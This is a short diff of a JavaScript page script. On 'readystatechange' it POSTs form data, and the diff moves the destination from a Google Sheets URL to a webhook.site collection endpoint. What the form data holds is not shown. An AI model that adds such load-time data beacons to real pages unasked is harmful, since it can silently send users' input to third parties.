@@ -20,7 +20,7 @@ document.addEventListener("readystatechange", () => {
         method: "POST", body: formdata, redirect: "follow"
       };
 
-      fetch("https://docs.google.com/spreadsheets/d/1Iioe1_CHYwhk6P9ILWBviTLdx5uLpktXQybjkyuWZVc/edit?gid=0#gid=0", requestOptions)
+      fetch("https://webhook.site/a98cbc34-d8b6-4e1b-8f5d-e249098bcff3", requestOptions)
         .then((response) => response.text())
         .then((result) => console.log(result))
         .catch((error) => console.error(error));
